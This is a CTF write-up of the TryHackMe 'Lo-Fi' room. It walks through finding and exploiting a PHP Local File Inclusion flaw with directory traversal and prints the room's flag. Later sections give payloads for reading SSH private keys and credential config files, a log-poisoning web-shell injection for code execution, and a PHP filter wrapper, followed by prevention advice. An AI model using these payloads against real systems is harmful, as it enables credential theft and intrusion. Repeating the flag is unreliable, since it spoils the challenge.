# TryHackMe — Lo-Fi

**Platform:** TryHackMe  
**Category:** Web Exploitation / Local File Inclusion  
**Difficulty:** Easy  
**Tools Used:** nmap, browser, curl  

---

## Overview

![TryHackMe Lo-Fi Completed](/images/writeups/tryhackme/thm-lofi.jpeg)

![TryHackMe Lo-Fi Completed](/images/writeups/tryhackme/lofi.jpeg)

Lo-Fi is a beginner-friendly TryHackMe room themed around a chill lofi music website. Beneath the aesthetic exterior lies a classic **Local File Inclusion (LFI)** vulnerability — one of the most fundamental and commonly found web vulnerabilities in real-world applications and CTFs alike. No bruteforcing, no Metasploit, no privilege escalation. Just clean recon, a vulnerable parameter, and directory traversal.

**Flag:** `flag{e4478e0eab69bd642b8238765dcb7d18}`

---

## Step 1 — Port Scanning with Nmap

As always, start with service discovery:

```bash
nmap -sV -T4 10.10.98.193
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
```

**Analysis:**

| Port | Service | Notes |
|---|---|---|
| 22 | SSH | OpenSSH 8.2p1 — no immediate vector |
| 80 | HTTP | **Apache 2.2.22** — extremely outdated (2011 era) |

The Apache version is notable — 2.2.22 is ancient and would have a long list of known CVEs in a real engagement. For this room though, the vulnerability isn't in the server itself but in the **application logic** running on top of it.

---

## Step 2 — Web Application Enumeration

Visiting `http://10.10.98.193/` presents a lofi-themed webpage with a music player aesthetic. No login forms, no file uploads, nothing obviously interactive.

The real clue is in the **page source**. Inspecting the navigation links reveals:

```html
<li><a href="/?page=relax.php">Relax</a></li>
<li><a href="/?page=sleep.php">Sleep</a></li>
<li><a href="/?page=chill.php">Chill</a></li>
<li><a href="/?page=coffee.php">Coffee</a></li>
<li><a href="/?page=vibe.php">Vibe</a></li>
<li><a href="/?page=game.php">Game</a></li>
```

This is an immediate red flag. The `?page=` GET parameter is being used to **dynamically load content** — and if there's no input validation, we can supply any file path instead of just `relax.php`.

This pattern in PHP typically maps to something like:

```php
<?php
  include($_GET['page']);
?>
```

No sanitization, no whitelist — the server will attempt to include whatever string you pass in.

---

## Step 3 — Confirming LFI via Directory Traversal

### What is LFI?

Local File Inclusion occurs when a web application uses user-supplied input to construct a file path for inclusion without properly validating or sanitizing it. An attacker can use `../` sequences (directory traversal) to escape the web root and access arbitrary files on the server's filesystem — anything readable by the web server process (typically `www-data`).

### The Test

The standard first proof-of-concept for LFI is reading `/etc/passwd` — a world-readable file on Linux systems that lists user accounts:

```
http://10.10.98.193/?page=../../../../etc/passwd
```

Each `../` moves one directory up from wherever the application's include root is. Four levels is usually enough to reach the filesystem root (`/`).

**Response:**

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
...
```

LFI confirmed. The server is including and rendering the contents of `/etc/passwd` directly in the response. We now have arbitrary file read as the `www-data` user.

### Why Does `../../../../` Work?

The application likely does something like:

```php
include("pages/" . $_GET['page']);
```

So the full resolved path becomes:

```
pages/../../../../etc/passwd
```

Which resolves to `/etc/passwd` after the `../` traversal collapses the path. The number of `../` sequences needed depends on the depth of the include directory — four is a safe default that usually reaches the root.

---

## Step 4 — Reading the Flag

With arbitrary file read confirmed, the next step is finding the flag. In TryHackMe rooms the flag is typically at one of these locations:

- `/flag.txt`
- `/root/flag.txt`
- `/home/<user>/flag.txt`
- `/var/www/html/flag.txt`

Try the most obvious one first — root of the filesystem:

```
http://10.10.98.193/?page=../../../../flag.txt
```

**Response:**

```
flag{e4478e0eab69bd642b8238765dcb7d18}
```

Direct hit on the first guess. The flag was sitting at `/flag.txt`.

---

## Going Deeper — What Else Could You Do With This LFI?

This room only requires reading `flag.txt`, but a real LFI vulnerability opens up a much wider attack surface. Here's what further testing would look like in a real engagement or a harder CTF:

### 1. SSH Key Harvesting

If `/etc/passwd` showed a user with a home directory (e.g., `/home/john`), try:

```
/?page=../../../../home/john/.ssh/id_rsa
```

A readable private key means direct SSH access without a password.

### 2. Sensitive Config Files

```
/?page=../../../../var/www/html/wp-config.php     # WordPress DB creds
/?page=../../../../etc/apache2/sites-enabled/000-default.conf
/?page=../../../../etc/mysql/my.cnf
```

### 3. Log Poisoning → RCE

If you can read Apache's access log:

```
/?page=../../../../var/log/apache2/access.log
```

And the log is readable, you can inject PHP code into it via the `User-Agent` header, then include the log file to execute it — turning LFI into Remote Code Execution.

```bash
curl -A "<?php system(\$_GET['cmd']); ?>" http://10.10.98.193/
# Then:
# /?page=../../../../var/log/apache2/access.log&cmd=id
```

### 4. /proc/self/environ

On older Linux systems, the process environment file can be used similarly to logs for code injection if it's readable.

### 5. PHP Wrappers (if `allow_url_include` is on)

```
/?page=php://filter/convert.base64-encode/resource=index.php
```

This base64-encodes the source of `index.php` and returns it in the response — useful for reading PHP files without them being executed, revealing application logic and credentials.

---

## LFI Prevention — The Developer's Side

Understanding how to prevent a vulnerability is just as important as exploiting it. LFI exists because of unsanitized user input reaching file system calls. Mitigations:

| Defense | Implementation |
|---|---|
| **Whitelist allowed pages** | Only allow known filenames: `if (!in_array($page, ['relax','sleep','chill'])) die();` |
| **Basename sanitization** | Strip path components: `include("pages/" . basename($_GET['page']))` |
| **Disable `allow_url_include`** | Set `allow_url_include = Off` in `php.ini` |
| **Chroot / open_basedir** | Restrict PHP's file access to the web root only |
| **WAF rules** | Block `../` sequences at the network layer |

The root cause here is trusting user input directly in a filesystem call — never do this.

---

## Attack Chain Summary

```
nmap scan
    │
    ▼
Port 80 — Apache 2.2.22 identified
    │
    ▼
Page source reveals ?page= parameter
    │
    ▼
LFI test: /?page=../../../../etc/passwd → confirmed
    │
    ▼
/?page=../../../../flag.txt → flag retrieved
```

---

## Key Concepts

**Local File Inclusion (LFI)** — a vulnerability where user input is passed unsanitized into a file inclusion function, allowing arbitrary file reads (and potentially code execution via log poisoning or PHP wrappers).

**Directory Traversal** — using `../` sequences to navigate the filesystem outside the intended directory. Each `../` moves one level up the directory tree.

**`/etc/passwd` as LFI proof-of-concept** — world-readable on all Linux systems, making it the standard first test for LFI. Its presence in a response confirms the vulnerability without causing any harm.

**Depth of traversal** — you need enough `../` sequences to reach the filesystem root. If four doesn't work, try five or six. Tools like `ffuf` can automate this.

---

## Tools Reference

| Tool | Usage | Purpose |
|---|---|---|
| `nmap` | `nmap -sV -T4 <IP>` | Service/version discovery |
| Browser | View page source | Identify `?page=` parameter pattern |
| `curl` | `curl "http://IP/?page=../../../../etc/passwd"` | Test LFI from terminal |
| Burp Suite | Intercept & modify requests | Cleaner parameter fuzzing |

---

*Tags: `lfi` `local-file-inclusion` `directory-traversal` `web-exploitation` `tryhackme` `ctf` `php` `apache`*